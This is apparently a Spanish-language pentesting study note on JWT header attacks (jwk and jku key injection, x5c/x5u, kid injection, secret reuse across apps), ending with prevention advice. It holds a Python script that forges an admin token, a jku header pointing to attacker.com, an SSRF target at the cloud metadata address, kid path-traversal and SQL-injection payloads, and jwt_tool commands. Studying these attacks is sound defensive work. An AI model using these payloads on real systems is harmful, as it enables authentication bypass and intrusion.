---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Authentication
  - JWT
Fecha de actualización: 2026-06-23
Nota previa: "[[04 - Confusión de algoritmos JWT]]"
Nota siguiente: "[[06 - Herramientas JWT y prevención]]"
Area: "[[Authentication Avanzado.base|Authentication Avanzado]]"
---
---

Más allá de `alg`, el header de un JWT admite claims que indican **qué clave** usar para verificar. Si la app confía en ellos sin restricción, le dictas la clave — y firmas tus propios tokens. Aquí están los vectores menos conocidos pero de alto impacto.

# Reutilización de secretos entre apps

Si una empresa hostea varias apps que comparten el **mismo secreto de firma**, un JWT de una vale en otra. <mark style="background: #FFB86CA6;">El problema escala cuando una app otorga más privilegios y ambas codifican el rol en el JWT</mark>: coges tu token de `socialA.htb` (donde eres `moderator`) y lo presentas en `socialB.htb` (donde eras `user`), heredando el rol. Es un fallo de segregación de claves trivial de probar: ¿el token de un sitio lo acepta otro del mismo proveedor?

# Inyección de clave: `jwk`

El claim `jwk` del header (JWS) puede **contener la clave pública** que verifica la firma. Si la app acepta cualquier clave que venga ahí, el ataque es total: generas tu par de claves, firmas con tu privada y adjuntas tu pública en `jwk`:

```shell-session
$ openssl genpkey -algorithm RSA -out priv.pem -pkeyopt rsa_keygen_bits:2048
$ openssl rsa -pubout -in priv.pem -out pub.pem
```

```python
import jwt
from cryptography.hazmat.primitives import serialization
from jose import jwk

pub = serialization.load_pem_public_key(open('pub.pem','rb').read())
jwk_dict = jwk.construct(pub, algorithm='RS256').to_dict()
token = jwt.encode({'user':'htb-stdnt','isAdmin':True}, open('priv.pem','rb').read(),
                   algorithm='RS256', headers={'jwk': jwk_dict})
print(token)
```

<mark style="background: #8000E1A6;">La app verifica la firma con **tu** clave pública y la valida — porque tú la firmaste.</mark> Lo automatiza `jwt_tool -X i` (inject inline JWKS).

# `jku`: clave remota (y SSRF de regalo)

`jku` es como `jwk` pero apunta a una **URL** que sirve el JWK Set. Si la app no restringe el host, alojas tu clave en tu servidor y pones `jku` apuntando a ella:

```json
{ "alg": "RS256", "jku": "https://attacker.com/jwks.json", "typ": "JWT" }
```

<mark style="background: #FF5582A6;">Doble premio</mark>: además de forjar el token, la app hace una petición GET al `jku` que controlas → es un [[02 - Identificación de SSRF|SSRF]] ciego basado en GET. Apuntando `jku` a recursos internos (`http://169.254.169.254/...`) puede revelar más. `jwt_tool -X s -ju <URL>` automatiza el spoof de JWKS.

# `x5c`, `x5u` y `kid`

- **`x5c` / `x5u`**: igual que `jwk`/`jku` pero con **certificados** (cadena X.509) en vez de claves. Mismo patrón de explotación.
- <mark style="background: #FFB86CA6;">**`kid` (Key ID)**</mark>: identifica qué clave usar. Su valor suele alimentar una búsqueda (en disco o BBDD), lo que lo convierte en un vector de **inyección**:
  - **Path traversal**: `"kid": "../../../../dev/null"` → la app lee un archivo vacío como clave; firmas con clave vacía conocida y verifica. Más potente que `/dev/null`: apuntar `kid` a un **fichero estático de contenido conocido** (un recurso público del propio host) y firmar HMAC con ese contenido exacto — no dependes de que el fichero esté vacío.
  - **SQLi**: si el `kid` consulta una BBDD, `"kid": "x' UNION SELECT 'mysecret"` inyecta la clave.
  - Hasta **command injection** en casos extremos.

```shell-session
$ jwt_tool <JWT> -I -hc kid -hv "../../../../../dev/null" -S hs256 -p ""
```

> [!warning]+ kid: el claim que convierte un JWT en cualquier inyección
> El `kid` es peligroso porque su valor viaja a un **sink** (filesystem, SQL, shell). Trátalo como cualquier otro input no confiable: prueba traversal, comillas SQL y metacaracteres. Requiere una app bastante descuidada, pero el impacto —firmar con una clave que tú controlas— es total.

# Prevención

Fijar la verificación: algoritmo en allowlist, **no** aceptar claves embebidas (`jwk`/`jku`/`x5c`) salvo de un origen en whitelist estricta, validar el `kid` contra un conjunto cerrado, y secretos distintos por aplicación. Lo recoge [[06 - Herramientas JWT y prevención|la nota de prevención]].

> [!info]+ Fuentes
> - [PortSwigger — JWT header injections (jwk, jku, kid)](https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter)
> - [RFC 7515 §4.1 — JWS header parameters](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1) · [jwt_tool](https://github.com/ticarpi/jwt_tool)
